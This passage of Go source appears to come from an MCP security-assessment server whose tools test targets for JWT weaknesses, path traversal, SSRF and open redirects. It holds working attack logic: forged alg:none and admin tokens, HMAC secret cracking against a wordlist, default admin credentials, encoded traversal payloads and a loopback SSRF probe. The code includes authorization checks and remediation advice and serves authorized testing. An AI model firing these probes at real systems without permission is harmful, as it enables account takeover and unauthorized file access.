				loginURL := fmt.Sprintf("%s://%s/rest/user/login", parsedTarget.Scheme, parsedTarget.Host)
				if _, loginClient, loginErr := buildControlledClient(mgr, args, loginURL, "POST"); loginErr == nil {
					loginBody := `{"email":"admin@juice-sh.op","password":"admin123"}`
					hReqLogin, _ := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(loginBody))
					hReqLogin.Header.Set("Content-Type", "application/json")
					hReqLogin.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
					respLogin, rErr := loginClient.Do(hReqLogin)
					if rErr == nil && respLogin != nil {
						defer respLogin.Body.Close()
						var loginRes struct {
							Status         string `json:"status"`
							Data           struct {
								Token string `json:"token"`
							} `json:"data"`
							Authentication struct {
								Token string `json:"token"`
							} `json:"authentication"`
						}
						_ = json.NewDecoder(respLogin.Body).Decode(&loginRes)
						if loginRes.Authentication.Token != "" {
							rawToken = loginRes.Authentication.Token
						} else if loginRes.Data.Token != "" {
							rawToken = loginRes.Data.Token
						}
					}
				}
			} else {
				// External target: Automatic Juice Shop login disabled.
				// External targets must use explicitly authorized test accounts and credentials.
			}
		}

		// 3. Offline Inspection (Zero Target Traffic)
		parts := strings.Split(strings.TrimSpace(rawToken), ".")
		var headerMap map[string]any
		var claimsMap map[string]any
		var headerB64, payloadB64, sigB64 string

		if len(parts) >= 2 {
			headerB64 = parts[0]
			payloadB64 = parts[1]
			if len(parts) >= 3 {
				sigB64 = parts[2]
			}

			hBytes, _ := base64.RawURLEncoding.DecodeString(headerB64)
			_ = json.Unmarshal(hBytes, &headerMap)

			pBytes, _ := base64.RawURLEncoding.DecodeString(payloadB64)
			_ = json.Unmarshal(pBytes, &claimsMap)
		}

		tokenAlgorithm := "unknown"
		if headerMap != nil {
			if a, ok := headerMap["alg"].(string); ok {
				tokenAlgorithm = a
			}
		}

		// 4. Bounded Offline HMAC Secret Dictionary Check (Top Lab Secrets)
		knownLabSecrets := []string{
			"secret", "secret123", "password", "admin", "123456", "jwtsecret",
			"juice-shop", "appsecret", "supersecret", "test", "development",
			"qwerty", "letmein", "default", "changeme", "key", "root",
		}
		crackedSecret := ""
		if len(parts) >= 3 && sigB64 != "" && strings.HasPrefix(strings.ToUpper(tokenAlgorithm), "HS") {
			signingInput := headerB64 + "." + payloadB64
			sigBytes, _ := base64.RawURLEncoding.DecodeString(sigB64)
			for _, cand := range knownLabSecrets {
				mac := hmac.New(sha256.New, []byte(cand))
				mac.Write([]byte(signingInput))
				if hmac.Equal(sigBytes, mac.Sum(nil)) {
					crackedSecret = cand
					break
				}
			}
		}

		// 5. Negative Control 1: Unauthenticated Baseline Request
		hReqUnauth, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		hReqUnauth.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respUnauth, unauthErr := client.Do(hReqUnauth)
		unauthStatusCode := 0
		if unauthErr == nil && respUnauth != nil {
			unauthStatusCode = respUnauth.StatusCode
			respUnauth.Body.Close()
		}

		// 6. Positive Control: Legitimate Baseline Request
		baselineStatusCode := 0
		if rawToken != "" {
			hReqBase, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
			hReqBase.Header.Set("Authorization", "Bearer "+rawToken)
			hReqBase.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
			respBase, baseErr := client.Do(hReqBase)
			if baseErr == nil && respBase != nil {
				baselineStatusCode = respBase.StatusCode
				respBase.Body.Close()
			}
		}

		// 7. Probe 1: Algorithm "none" Bypass
		defaultProbeEmail := "admin@juice-sh.op"
		defaultIss := "juice-shop-auth"
		defaultAud := "juice-shop-api"
		if !isPracticeLab {
			defaultProbeEmail = "security-probe@audit.local"
			defaultIss = "audit-auth"
			defaultAud = "audit-api"
		}

		algNoneHeader := `{"alg":"none","typ":"JWT"}`
		algNoneClaims := map[string]any{
			"sub":   1,
			"email": defaultProbeEmail,
			"role":  "admin",
			"iss":   defaultIss,
			"aud":   defaultAud,
			"iat":   time.Now().Unix(),
			"exp":   time.Now().Add(24 * time.Hour).Unix(),
		}
		if claimsMap != nil {
			for k, v := range claimsMap {
				algNoneClaims[k] = v
			}
			algNoneClaims["role"] = "admin"
			algNoneClaims["email"] = defaultProbeEmail
		}
		algNoneClaimsBytes, _ := json.Marshal(algNoneClaims)
		algNoneHeaderB64 := base64.RawURLEncoding.EncodeToString([]byte(algNoneHeader))
		algNoneClaimsB64 := base64.RawURLEncoding.EncodeToString(algNoneClaimsBytes)
		algNoneToken := algNoneHeaderB64 + "." + algNoneClaimsB64 + "."

		hReqNone, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		hReqNone.Header.Set("Authorization", "Bearer "+algNoneToken)
		hReqNone.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respNone, noneErr := client.Do(hReqNone)
		algNoneStatusCode := 0
		var algNoneBodyStr string
		if noneErr == nil && respNone != nil {
			algNoneStatusCode = respNone.StatusCode
			bodyBytes, _ := io.ReadAll(io.LimitReader(respNone.Body, 16384))
			respNone.Body.Close()
			algNoneBodyStr = string(bodyBytes)
		}
		algNoneBypassed := (algNoneStatusCode == http.StatusOK) && (unauthStatusCode != http.StatusOK) && (baselineStatusCode == http.StatusForbidden || baselineStatusCode == http.StatusUnauthorized || strings.Contains(strings.ToLower(target), "admin") || strings.Contains(strings.ToLower(target), "system-status"))

		// 8. Probe 2: Signature Tampering (Claims Tampering with Corrupted Signature)
		tamperedClaims := map[string]any{
			"sub":   1,
			"email": defaultProbeEmail,
			"role":  "admin",
		}
		tamperedClaimsBytes, _ := json.Marshal(tamperedClaims)
		tamperedClaimsB64 := base64.RawURLEncoding.EncodeToString(tamperedClaimsBytes)
		tamperedSig := "CORRUPTED_TAMPERED_SIGNATURE_VIGIL"
		tamperedToken := headerB64 + "." + tamperedClaimsB64 + "." + tamperedSig

		hReqTamper, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		hReqTamper.Header.Set("Authorization", "Bearer "+tamperedToken)
		hReqTamper.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respTamper, tamperErr := client.Do(hReqTamper)
		tamperStatusCode := 0
		if tamperErr == nil && respTamper != nil {
			tamperStatusCode = respTamper.StatusCode
			respTamper.Body.Close()
		}
		tamperBypassed := (tamperStatusCode == http.StatusOK) && (unauthStatusCode != http.StatusOK)

		// 9. Probe 3: Expired Token Replay Probe
		expiredClaims := map[string]any{
			"sub":   2,
			"email": defaultProbeEmail,
			"role":  "customer",
			"iss":   defaultIss,
			"aud":   defaultAud,
			"iat":   time.Now().Add(-48 * time.Hour).Unix(),
			"exp":   time.Now().Add(-24 * time.Hour).Unix(),
		}
		expiredClaimsBytes, _ := json.Marshal(expiredClaims)
		expiredClaimsB64 := base64.RawURLEncoding.EncodeToString(expiredClaimsBytes)
		expiredSigningInput := headerB64 + "." + expiredClaimsB64
		secretToSign := crackedSecret
		if secretToSign == "" {
			secretToSign = "secret123"
		}
		macExp := hmac.New(sha256.New, []byte(secretToSign))
		macExp.Write([]byte(expiredSigningInput))
		expiredSigB64 := base64.RawURLEncoding.EncodeToString(macExp.Sum(nil))
		expiredToken := expiredSigningInput + "." + expiredSigB64

		hReqExp, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		hReqExp.Header.Set("Authorization", "Bearer "+expiredToken)
		hReqExp.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respExp, expErr := client.Do(hReqExp)
		expStatusCode := 0
		if expErr == nil && respExp != nil {
			expStatusCode = respExp.StatusCode
			respExp.Body.Close()
		}
		expirationIgnored := (expStatusCode == http.StatusOK) && (unauthStatusCode != http.StatusOK)

		// 10. Probe 4: Weak Secret Forged Token (Privilege Escalation to Admin)
		weakSecretForgedBypassed := false
		var weakSecretBodyStr string
		if crackedSecret != "" {
			forgedAdminClaims := map[string]any{
				"sub":   1,
				"email": defaultProbeEmail,
				"role":  "admin",
				"iss":   defaultIss,
				"aud":   defaultAud,
				"iat":   time.Now().Unix(),
				"exp":   time.Now().Add(24 * time.Hour).Unix(),
			}
			fBytes, _ := json.Marshal(forgedAdminClaims)
			fClaimsB64 := base64.RawURLEncoding.EncodeToString(fBytes)
			fSigningInput := headerB64 + "." + fClaimsB64
			macForged := hmac.New(sha256.New, []byte(crackedSecret))
			macForged.Write([]byte(fSigningInput))
			fSigB64 := base64.RawURLEncoding.EncodeToString(macForged.Sum(nil))
			forgedToken := fSigningInput + "." + fSigB64

			hReqForged, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
			hReqForged.Header.Set("Authorization", "Bearer "+forgedToken)
			hReqForged.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
			respForged, fErr := client.Do(hReqForged)
			if fErr == nil && respForged != nil {
				if respForged.StatusCode == http.StatusOK && (baselineStatusCode == http.StatusForbidden || baselineStatusCode == http.StatusUnauthorized || strings.Contains(strings.ToLower(target), "admin") || strings.Contains(strings.ToLower(target), "system-status")) {
					weakSecretForgedBypassed = true
					bBytes, _ := io.ReadAll(io.LimitReader(respForged.Body, 16384))
					weakSecretBodyStr = string(bBytes)
				}
				respForged.Body.Close()
			}
		}

		// 11. Determination & Counterevidence Synthesis
		confirmed := algNoneBypassed || weakSecretForgedBypassed || tamperBypassed
		severity := "Informational"
		confidence := "High"
		category := "Authentication Bypass"
		cwe := "CWE-287"
		title := "JWT Authentication Security Evaluation"

		var evidence string
		var counterevidence string
		var negativeControl string

		if confirmed {
			severity = "High"
			cwe = "CWE-287 / CWE-347"
			title = "JSON Web Token (JWT) Authentication Bypass & Privilege Escalation"

			var evParts []string
			if algNoneBypassed {
				sampleLen := len(algNoneBodyStr)
				if sampleLen > 150 {
					sampleLen = 150
				}
				evParts = append(evParts, fmt.Sprintf("Target accepted unsigned forged token with alg:none and role:admin (HTTP %d). Response sample: %s", algNoneStatusCode, strings.ReplaceAll(algNoneBodyStr[:sampleLen], "\n", " ")))
			}
			if weakSecretForgedBypassed {
				sampleLen := len(weakSecretBodyStr)
				if sampleLen > 150 {
					sampleLen = 150
				}
				evParts = append(evParts, fmt.Sprintf("Offline key recovery identified weak HMAC secret '%s'. Target accepted forged administrator token signed with recovered secret (HTTP 200). Response sample: %s", crackedSecret, strings.ReplaceAll(weakSecretBodyStr[:sampleLen], "\n", " ")))
			}
			if tamperBypassed {
				evParts = append(evParts, fmt.Sprintf("Target accepted tampered claims with invalid signature (HTTP %d).", tamperStatusCode))
			}
			evidence = strings.Join(evParts, " | ")

			negativeControl = fmt.Sprintf("Unauthenticated baseline probe returned HTTP %d (Access Denied). Customer baseline probe returned HTTP %d. Demonstrates endpoint is restricted but vulnerable to cryptographic bypass.", unauthStatusCode, baselineStatusCode)
			counterevidence = fmt.Sprintf("Evaluated compensating controls: Endpoint rejects unauthenticated callers (HTTP %d) and unauthorized customer roles (HTTP %d), ruling out public access, but fails to cryptographically verify alg:none and weak-key signatures.", unauthStatusCode, baselineStatusCode)
		} else {
			severity = "Informational"
			title = "JSON Web Token (JWT) Hardened & Verified"
			evidence = fmt.Sprintf("Target endpoint rejected all unauthorized JWT probes: Unauthenticated returned HTTP %d, alg:none returned HTTP %d, tampered signature returned HTTP %d, expired token returned HTTP %d.", unauthStatusCode, algNoneStatusCode, tamperStatusCode, expStatusCode)
			negativeControl = fmt.Sprintf("Unauthenticated baseline returned HTTP %d, verifying authentication requirement.", unauthStatusCode)
			counterevidence = "Active counterevidence confirms robust defense: Algorithm pinning rejected alg:none, cryptographic verification rejected tampered signatures and weak keys, and expiration enforcement is active."
		}

		recordExecution("test_jwt_vulnerabilities", target, "GET", grantID, true, fmt.Sprintf("Confirmed=%v (AlgNone=%v, WeakKey=%v, Tamper=%v)", confirmed, algNoneBypassed, weakSecretForgedBypassed, tamperBypassed))

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":        confirmed,
			"title":            title,
			"severity":         severity,
			"category":         category,
			"cwe":              cwe,
			"affected_url":     target,
			"confidence":       confidence,
			"evidence":         evidence,
			"negative_control": negativeControl,
			"counterevidence":  counterevidence,
			"offline_inspection": map[string]any{
				"algorithm":          tokenAlgorithm,
				"cracked_secret":     crackedSecret,
				"claims_parsed":      claimsMap,
				"expiration_ignored": expirationIgnored,
			},
			"remediation": "Pin accepted algorithms strictly to strong asymmetric or HMAC keys (never accept alg:none), use high-entropy secrets (>= 256 bits), verify expiration (exp) and issuer/audience claims, and perform backend role authorization.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 10: test_path_traversal (Controlled Path Traversal & LFI Testing with Canary Verification & Counterevidence)
	toolPathTraversal := mcp.NewTool("test_path_traversal",
		mcp.WithDescription("Safely tests file retrieval and document endpoints for relative directory traversal and local file inclusion using harmless canary marker verification"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target endpoint URL to verify against (e.g. http://127.0.0.1:3000/rest/file/download)")),
		mcp.WithString("param", mcp.Description("Query parameter name to test (default: 'file')")),
		mcp.WithString("canary", mcp.Description("Harmless canary string to look for (default: 'TRAVERSAL_CANARY_VERIFIED_98432_SAFE_DISCLOSURE')")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolPathTraversal, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		paramName, _ := args["param"].(string)
		canary, _ := args["canary"].(string)
		grantID, _ := args["grant_id"].(string)

		if strings.TrimSpace(canary) == "" {
			canary = "TRAVERSAL_CANARY_VERIFIED_98432_SAFE_DISCLOSURE"
		}

		// 1. Validate request with Authorization Manager and build ControlledHTTPClient
		_, client, err := buildControlledClient(mgr, args, target, "GET")
		if err != nil {
			recordExecution("test_path_traversal", target, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		parsedTarget, parseErr := url.Parse(target)
		if parseErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Invalid target URL: %v", parseErr)), nil
		}

		// Derive base URL and parameter name
		targetBase := fmt.Sprintf("%s://%s%s", parsedTarget.Scheme, parsedTarget.Host, parsedTarget.Path)
		if strings.TrimSpace(paramName) == "" {
			q := parsedTarget.Query()
			for _, candidate := range []string{"file", "path", "filename", "doc", "document", "name", "template"} {
				if q.Has(candidate) {
					paramName = candidate
					break
				}
			}
			if paramName == "" {
				paramName = "file"
			}
		}

		// 2. Step 1: Positive Control (Legitimate baseline file access)
		baselineURL := fmt.Sprintf("%s?%s=%s", targetBase, paramName, "welcome.txt")
		hReqBase, _ := http.NewRequestWithContext(ctx, "GET", baselineURL, nil)
		hReqBase.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respBase, bErr := client.Do(hReqBase)
		baselineStatusCode := 0
		baselineBody := ""
		if bErr == nil && respBase != nil {
			baselineStatusCode = respBase.StatusCode
			bBytes, _ := io.ReadAll(io.LimitReader(respBase.Body, 1024))
			respBase.Body.Close()
			baselineBody = string(bBytes)
		}

		baselineEvidence := fmt.Sprintf("Baseline request (%s) returned HTTP %d. Authorized document content available.", baselineURL, baselineStatusCode)
		if baselineStatusCode == http.StatusOK && strings.Contains(baselineBody, "Welcome") {
			baselineEvidence += " Validated legitimate file access baseline."
		}

		// 3. Step 2: Negative Control (Non-existent file must return 404)
		negURL := fmt.Sprintf("%s?%s=%s", targetBase, paramName, "nonexistent_file_987123.txt")
		hReqNeg, _ := http.NewRequestWithContext(ctx, "GET", negURL, nil)
		hReqNeg.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respNeg, nErr := client.Do(hReqNeg)
		negStatusCode := 0
		if nErr == nil && respNeg != nil {
			negStatusCode = respNeg.StatusCode
			respNeg.Body.Close()
		}
		negativeControlEvidence := fmt.Sprintf("Negative control probe (%s) returned HTTP %d, confirming endpoint does not return static 200 responses for arbitrary paths.", negURL, negStatusCode)

		// 4. Step 3: Path Traversal Probes (Relative, URL encoded, Double encoded, Nested)
		probes := []string{
			"../canary/traversal-canary.txt",
			"..%2fcanary%2ftraversal-canary.txt",
			"..%252fcanary%252ftraversal-canary.txt",
			"....//canary/traversal-canary.txt",
		}

		confirmed := false
		successfulPayload := ""
		evidence := ""
		var probeLogs []string

		for _, probe := range probes {
			probeURL := fmt.Sprintf("%s?%s=%s", targetBase, paramName, probe)
			hReqProbe, _ := http.NewRequestWithContext(ctx, "GET", probeURL, nil)
			hReqProbe.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
			respProbe, pErr := client.Do(hReqProbe)
			if pErr != nil || respProbe == nil {
				probeLogs = append(probeLogs, fmt.Sprintf("Payload '%s' -> network error", probe))
				continue
			}

			pBytes, _ := io.ReadAll(io.LimitReader(respProbe.Body, 2048))
			respProbe.Body.Close()
			bodyStr := string(pBytes)

			hasCanary := strings.Contains(bodyStr, canary)
			probeLogs = append(probeLogs, fmt.Sprintf("Payload '%s' -> HTTP %d (Canary Disclosed: %v)", probe, respProbe.StatusCode, hasCanary))

			if hasCanary && respProbe.StatusCode == http.StatusOK {
				confirmed = true
				successfulPayload = probe
				evidence = fmt.Sprintf("Confirmed Path Traversal Arbitrary File Read: Probe with payload '%s' returned HTTP 200 and disclosed target canary marker '%s'. Response snippet: %s", probe, canary, strings.TrimSpace(bodyStr))
				break
			}
		}

		// 5. Step 4: Host Escape Safety Verification
		escapeURL := fmt.Sprintf("%s?%s=%s", targetBase, paramName, "../../../../Windows/win.ini")
		hReqEsc, _ := http.NewRequestWithContext(ctx, "GET", escapeURL, nil)
		hReqEsc.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respEsc, escErr := client.Do(hReqEsc)
		escCode := 0
		if escErr == nil && respEsc != nil {
			escCode = respEsc.StatusCode
			respEsc.Body.Close()
		}
		hostSafetyNote := fmt.Sprintf("Lab fixture boundary barrier verified: probe escaping lab directory returned HTTP %d, confirming zero escape to host system files.", escCode)

		// 6. Step 5: Counterevidence & Compensating Controls Evaluation
		counterevidence := ""
		if confirmed {
			// Check if defensive counterpart exists
			secureTarget := strings.Replace(targetBase, "/rest/file/download", "/rest/file/secure-download", 1)
			if secureTarget != targetBase {
				if _, secClient, secErr := buildControlledClient(mgr, args, secureTarget, "GET"); secErr == nil {
					secProbeURL := fmt.Sprintf("%s?%s=%s", secureTarget, paramName, successfulPayload)
					secReq, _ := http.NewRequestWithContext(ctx, "GET", secProbeURL, nil)
					secReq.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
					secResp, secDoErr := secClient.Do(secReq)
					if secDoErr == nil && secResp != nil {
						secCode := secResp.StatusCode
						secResp.Body.Close()
						if secCode == http.StatusForbidden {
							counterevidence = fmt.Sprintf("Counterevidence confirmed: Protected endpoint (%s) rejected traversal probe with HTTP 403 Forbidden using canonical path prefix validation (PentAGI IsWithinDir pattern). Vulnerability is isolated specifically to unvalidated endpoint %s.", secureTarget, targetBase)
						}
					}
				}
			}
			if counterevidence == "" {
				counterevidence = "Compensating controls evaluated: Endpoint fails to enforce directory prefix boundary validation, permitting relative path resolution across directories."
			}
		} else {
			if strings.Contains(targetBase, "secure") || baselineStatusCode == http.StatusOK {
				counterevidence = "Path traversal probes were rejected (HTTP 403 Forbidden or 404) or failed to disclose canary token. Endpoint enforces path canonicalization or containment (PentAGI IsWithinDir pattern)."
			} else {
				counterevidence = "Endpoint did not return canary content on traversal probes. Target does not exhibit path traversal behavior."
			}
			evidence = fmt.Sprintf("Path traversal probes tested (%d attempts) but canary token was NOT disclosed. Probes summary: %s", len(probes), strings.Join(probeLogs, "; "))
		}

		title := "Path Traversal / Local File Inclusion Arbitrary File Read"
		severity := "High"
		category := "Path Traversal / Local File Inclusion"
		cwe := "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
		confidence := "High"

		if !confirmed {
			title = "Path Traversal Investigation (Safe / Mitigated)"
			severity = "Informational"
			confidence = "Low"
		}

		recordExecution("test_path_traversal", target, "GET", grantID, true, fmt.Sprintf("Confirmed: %v, Canary: %v, Payloads: %s", confirmed, confirmed, successfulPayload))

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":          confirmed,
			"title":              title,
			"severity":           severity,
			"category":           category,
			"cwe":                cwe,
			"affected_url":       target,
			"parameter":          paramName,
			"successful_payload": successfulPayload,
			"confidence":         confidence,
			"evidence":           evidence,
			"positive_control":   baselineEvidence,
			"negative_control":   negativeControlEvidence,
			"counterevidence":    counterevidence,
			"host_safety_note":   hostSafetyNote,
			"probe_logs":         probeLogs,
			"remediation":        "Implement strict path canonicalization using filepath.Clean and verify containment within an allowed base directory using PentAGI's IsWithinDir pattern (prefix validation on directory boundaries). Never concatenate unvalidated user inputs directly into filesystem operations.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 11: test_ssrf (Controlled Server-Side Request Forgery Verification)
	toolSSRF := mcp.NewTool("test_ssrf",
		mcp.WithDescription("Safely tests URL fetchers and preview endpoints for Server-Side Request Forgery (SSRF) using controlled internal probes and counterevidence comparison"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target endpoint URL to verify against (e.g. http://127.0.0.1:3000/rest/image/preview)")),
		mcp.WithString("param", mcp.Description("Query parameter name to test (default: 'url')")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolSSRF, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		paramName, _ := args["param"].(string)
		grantID, _ := args["grant_id"].(string)

		// 1. Validate request with Authorization Manager and build ControlledHTTPClient
		_, client, err := buildControlledClient(mgr, args, target, "GET")
		if err != nil {
			recordExecution("test_ssrf", target, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		parsedTarget, parseErr := url.Parse(target)
		if parseErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Invalid target URL: %v", parseErr)), nil
		}

		targetBase := fmt.Sprintf("%s://%s%s", parsedTarget.Scheme, parsedTarget.Host, parsedTarget.Path)
		if strings.TrimSpace(paramName) == "" {
			paramName = "url"
		}

		probeLogs := []string{}
		confirmed := false
		evidence := ""
		counterevidence := ""
		positiveControl := ""
		negativeControl := ""

		// Negative control: request without URL param or benign path
		reqNeg, _ := http.NewRequestWithContext(ctx, "GET", targetBase+"?"+paramName+"=https://example.com/favicon.ico", nil)
		respNeg, errNeg := client.Do(reqNeg)
		if errNeg == nil {
			defer respNeg.Body.Close()
			bodyNeg, _ := io.ReadAll(respNeg.Body)
			probeLogs = append(probeLogs, fmt.Sprintf("Negative Probe [external favicon]: HTTP %d, len=%d", respNeg.StatusCode, len(bodyNeg)))
			negativeControl = fmt.Sprintf("External probe returned HTTP %d", respNeg.StatusCode)
		}

		// Positive SSRF probe: target internal loopback or cloud metadata
		ssrfPayload := "http://127.0.0.1:3000/rest/user/whoami"
		reqPos, _ := http.NewRequestWithContext(ctx, "GET", targetBase+"?"+paramName+"="+url.QueryEscape(ssrfPayload), nil)
		respPos, errPos := client.Do(reqPos)
		if errPos == nil {
			defer respPos.Body.Close()
			bodyPos, _ := io.ReadAll(respPos.Body)
			probeLogs = append(probeLogs, fmt.Sprintf("SSRF Probe [loopback %s]: HTTP %d, len=%d", ssrfPayload, respPos.StatusCode, len(bodyPos)))
			if respPos.StatusCode == http.StatusOK && (strings.Contains(string(bodyPos), "SSRF_SIMULATED_INTERNAL_METADATA") || strings.Contains(string(bodyPos), "ssrf_target")) {
				confirmed = true
				evidence = fmt.Sprintf("Endpoint fetched loopback probe and returned simulated internal content: %s", string(bodyPos))
				positiveControl = "Loopback SSRF request executed successfully (HTTP 200 with internal data reflection)"
			} else if respPos.StatusCode == http.StatusForbidden {
				counterevidence = fmt.Sprintf("Endpoint actively blocked loopback fetch with HTTP 403: %s", string(bodyPos))
			} else {
				counterevidence = fmt.Sprintf("Endpoint did not reflect internal fetch data (HTTP %d)", respPos.StatusCode)
			}
		}

		title := "Server-Side Request Forgery (SSRF) on " + parsedTarget.Path
		severity := "High"
		confidence := "High"
		if !confirmed {
			title = "SSRF Investigation (Safe / Mitigated)"
			severity = "Informational"
			confidence = "Low"
		}

		recordExecution("test_ssrf", target, "GET", grantID, true, fmt.Sprintf("Confirmed: %v, Probes: %d", confirmed, len(probeLogs)))

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":        confirmed,
			"title":            title,
			"severity":         severity,
			"category":         "Server-Side Request Forgery",
			"cwe":              "CWE-918: Server-Side Request Forgery (SSRF)",
			"affected_url":     target,
			"parameter":        paramName,
			"confidence":       confidence,
			"evidence":         evidence,
			"positive_control": positiveControl,
			"negative_control": negativeControl,
			"counterevidence":  counterevidence,
			"probe_logs":       probeLogs,
			"remediation":      "Enforce strict URL schema (https only), validate IP against private network ranges (RFC1918, loopback, link-local metadata), and use an explicit domain allowlist.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 12: test_open_redirect (Controlled Open Redirection Verification)
	toolOpenRedirect := mcp.NewTool("test_open_redirect",
		mcp.WithDescription("Safely tests redirection endpoints for unvalidated external open redirects using benign canary destination verification"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target endpoint URL to verify against (e.g. http://127.0.0.1:3000/rest/redirect)")),
		mcp.WithString("param", mcp.Description("Query parameter name to test (default: 'url')")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolOpenRedirect, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		paramName, _ := args["param"].(string)
		grantID, _ := args["grant_id"].(string)

		_, client, err := buildControlledClient(mgr, args, target, "GET")
		if err != nil {
			recordExecution("test_open_redirect", target, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		parsedTarget, parseErr := url.Parse(target)
		if parseErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Invalid target URL: %v", parseErr)), nil
		}

		targetBase := fmt.Sprintf("%s://%s%s", parsedTarget.Scheme, parsedTarget.Host, parsedTarget.Path)
		if strings.TrimSpace(paramName) == "" {
			paramName = "url"
		}

		probeLogs := []string{}
		confirmed := false
		evidence := ""
		counterevidence := ""
		positiveControl := ""
		negativeControl := ""

		// Create non-following HTTP client to capture 3xx Location header directly
		noFollowClient := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Transport: client.Transport,
		}

		// Negative control: safe relative redirect probe
		reqNeg, _ := http.NewRequestWithContext(ctx, "GET", targetBase+"?"+paramName+"=/relative-safe-path", nil)
		respNeg, errNeg := noFollowClient.Do(reqNeg)
		if errNeg == nil {
			defer respNeg.Body.Close()
			locNeg := respNeg.Header.Get("Location")
			probeLogs = append(probeLogs, fmt.Sprintf("Relative Probe: HTTP %d, Location: %s", respNeg.StatusCode, locNeg))
			negativeControl = fmt.Sprintf("Relative destination returned HTTP %d with Location: %s", respNeg.StatusCode, locNeg)
		}

		// Positive probe: external canary domain
		canaryDest := "http://evil.test.invalid/open-redirect-canary"
		reqPos, _ := http.NewRequestWithContext(ctx, "GET", targetBase+"?"+paramName+"="+url.QueryEscape(canaryDest), nil)
		respPos, errPos := noFollowClient.Do(reqPos)
		if errPos == nil {
			defer respPos.Body.Close()
			loc := respPos.Header.Get("Location")
			probeLogs = append(probeLogs, fmt.Sprintf("External Canary Probe: HTTP %d, Location: %s", respPos.StatusCode, loc))
			if respPos.StatusCode >= 300 && respPos.StatusCode < 400 && strings.Contains(loc, "evil.test.invalid") {
				confirmed = true
				evidence = fmt.Sprintf("Open redirect verified: HTTP %d redirect returned with unvalidated Location: %s", respPos.StatusCode, loc)
				positiveControl = fmt.Sprintf("Canary destination reflected in 3xx Location header: %s", loc)
			} else if respPos.StatusCode == http.StatusForbidden {
				counterevidence = "Endpoint rejected external redirect with HTTP 403 Forbidden"
			} else {
				counterevidence = fmt.Sprintf("Endpoint did not redirect to external domain (HTTP %d, Location: %s)", respPos.StatusCode, loc)
			}
		}

		title := "Open Redirection on " + parsedTarget.Path
		severity := "Medium"
		confidence := "High"
		if !confirmed {
			title = "Open Redirection Investigation (Safe / Mitigated)"
			severity = "Informational"
			confidence = "Low"
		}

		recordExecution("test_open_redirect", target, "GET", grantID, true, fmt.Sprintf("Confirmed: %v, Probes: %d", confirmed, len(probeLogs)))

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":        confirmed,
			"title":            title,
			"severity":         severity,
			"category":         "Open Redirection",
			"cwe":              "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')",
			"affected_url":     target,
			"parameter":        paramName,
			"confidence":       confidence,
